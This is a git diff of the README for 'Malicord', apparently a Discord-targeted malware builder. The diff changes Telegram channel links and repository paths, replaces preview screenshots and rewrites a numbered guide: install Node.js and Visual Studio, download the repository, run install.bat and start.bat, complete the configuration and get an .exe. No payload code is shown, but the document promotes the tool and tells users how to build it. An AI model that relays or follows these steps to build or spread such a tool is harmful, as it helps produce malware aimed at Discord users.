@@ -5,7 +5,9 @@
 <h1 align="center">
   Malicord
 </h1>
-
+<p align="center">
+  Telegram server: https://t.me/+xM8hLV4lre81YjI8
+ </p>
 <p align="center"> 
   <kbd>
 <img src="https://i.redd.it/9vfqb0o839o91.png" width="328"></img>
@@ -13,14 +15,11 @@
 </p>
 
 <p align="center">
-<img src="https://img.shields.io/github/last-commit/KSCH-58/Malicord?style=flat">
-<img src="https://img.shields.io/github/stars/KSCH-58/Malicord?color=brightgreen">
-<img src="https://img.shields.io/github/forks/KSCH-58/Malicord?color=brightgreen">
+<img src="https://img.shields.io/github/last-commit/Malicord/Malicord?style=flat">
+<img src="https://img.shields.io/github/stars/Malicord/Malicord?color=brightgreen">
+<img src="https://img.shields.io/github/forks/Malicord/Malicord?color=brightgreen">
 </p>
 
-<p align="center">
-  Telegram server: https://t.me/Sordeal
- </p>
 
 ## <a id="content"></a>🌐 〢 Content
 
@@ -40,13 +39,12 @@
 ## <a id="setup"></a> 📁 〢 Setting up
 
 0. Install [Nodejs V18.5.0](https://nodejs.org/dist/v18.15.0/node-v18.15.0-x64.msi)
-1. Install [VisualStudio](https://visualstudio.microsoft.com/de/thank-you-downloading-visual-studio/?sku=Community&channel=Release&version=VS2022&source=VSLandingPage&passive=false&cid=2030)
-2. Install "Desktop development with C++" workload
-3. Install [Files](https://github.com/KSCH-58/Malicord/archive/refs/heads/main.zip)
-4. Install all modules [install.bat](https://github.com/KSCH-58/Malicord/blob/main/install.bat)
-5. Click on [start.bat](https://github.com/KSCH-58/Malicord/blob/main/start.bat)
-6. Complete the configuration
-7. You have your .exe file enjoy
+1. Install [VisualStudio developpement desktop c+++](https://visualstudio.microsoft.com/de/thank-you-downloading-visual-studio/?sku=Community&channel=Release&version=VS2022&source=VSLandingPage&passive=false&cid=2030)
+2. Install [Files](https://github.com/Malicord/Malicord/archive/refs/heads/main.zip)
+3. Install all modules [install.bat](https://github.com/Malicord/Malicord/blob/main/install.bat)
+4. Click on [start.bat](https://github.com/Malicord/Malicord/blob/main/start.bat)
+5. Complete the configuration
+6. You have your .exe file enjoy
 
 <a id="features"></a>
 
@@ -181,11 +179,16 @@ Build Bot Features (9):
 
 ### <a id="preview"></a>👁️ 〢 Preview
 
-<img title="" src="https://raw.githubusercontent.com/KSCH-58/cerf/main/assets/E3JZKJvEye.png" alt="" width="539">
-<img title="" src="https://raw.githubusercontent.com/KSCH-58/cerf/main/assets/CvfWVzDVG3.png" alt="" width="539">
+<img title="" src="https://raw.githubusercontent.com/KSCH-58/sub/main/assets/Discord_oIft7C46Sm.png" alt="" width="639">
+<img title="" src="https://raw.githubusercontent.com/KSCH-58/sub/main/assets/Discord_jhcfZCItAO.png" alt="" width="639">
 
-<img title="" src="https://raw.githubusercontent.com/KSCH-58/cerf/main/assets/UMhjoDF5GK.png" alt="" width="639">
+<img title="" src="https://raw.githubusercontent.com/KSCH-58/sub/main/assets/Discord_1jkJB3yAWX.png" alt="" width="539">
+<img title="" src="https://raw.githubusercontent.com/KSCH-58/sub/main/assets/Discord_LFxsujL7JP.png" alt="" width="539">
 
+<img title="" src="https://raw.githubusercontent.com/KSCH-58/sub/main/assets/Discord_N8Qz9JN9Cm.png" alt="" width="639">
+
+<img title="" src="https://raw.githubusercontent.com/KSCH-58/sub/main/assets/Discord_OteanFWy4t.png" alt="" width="639">
+<img title="" src="https://raw.githubusercontent.com/KSCH-58/sub/main/assets/Discord_Zai2DcZvZJ.png" alt="" width="639">
 
 <a id="todo"></a>
 
@@ -211,10 +214,6 @@ Build Bot Features (9):
 ```diff
 v8.5 ⋮ 2023-05-11
 + First commit
-
-v9 ⋮ 2023-21-11
-+ links fixed
-+ readme update
 ```
 
 <a id="note"></a>
